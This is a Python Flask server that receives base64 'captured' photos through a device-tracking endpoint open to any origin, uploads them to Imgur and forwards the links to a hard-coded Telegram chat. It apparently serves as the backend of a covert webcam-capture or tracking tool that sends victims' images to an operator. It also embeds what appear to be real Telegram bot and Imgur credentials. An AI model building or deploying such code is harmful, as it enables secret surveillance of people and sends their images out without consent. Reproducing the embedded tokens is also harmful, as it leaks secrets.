import os
import json
import requests
import base64
from io import BytesIO
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True, origins="*")

# ✅ Telegram Bot Configuration
BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
CHAT_ID = "7526005252"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ✅ Imgur API Configuration
IMGUR_CLIENT_ID = "0cbc84540162ee0"  # 🔹 Replace with your Client ID
IMGUR_UPLOAD_URL = "https://api.imgur.com/3/image"

def upload_to_imgur(base64_photo):
    """Upload Base64 image to Imgur and return the URL."""
    headers = {"Authorization": f"Client-ID {IMGUR_CLIENT_ID}"}
    payload = {"image": base64_photo, "type": "base64"}

    response = requests.post(IMGUR_UPLOAD_URL, headers=headers, data=payload)
    response_data = response.json()

    if response.status_code == 200 and response_data.get("success"):
        return response_data["data"]["link"]
    else:
        print("❌ Imgur Upload Failed:", response_data)
        return None

def send_telegram_photo(image_url, caption):
    """Send an image URL to Telegram bot."""
    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
    response = requests.post(TELEGRAM_PHOTO_API, json=payload)
    print("📷 Photo Response:", response.text)  # ✅ Debugging

@app.route('/track/<session_id>', methods=['POST'])
def track_device(session_id):
    """Track user device info and send data to Telegram."""
    try:
        data = request.json
        print("📥 Received Data:", data)  # ✅ Debugging

        if not data:
            return jsonify({"error": "Invalid JSON data"}), 400

        photo_base64 = data.get("photo", None)

        if photo_base64:
            # 🔹 Upload to Imgur & get the URL
            imgur_url = upload_to_imgur(photo_base64.split(",")[1])

            if imgur_url:
                send_telegram_photo(imgur_url, "📷 Captured Photo")
            else:
                print("❌ Failed to upload photo.")

        return jsonify({"status": "success"}), 200

    except Exception as e:
        print("❌ Error:", str(e))
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
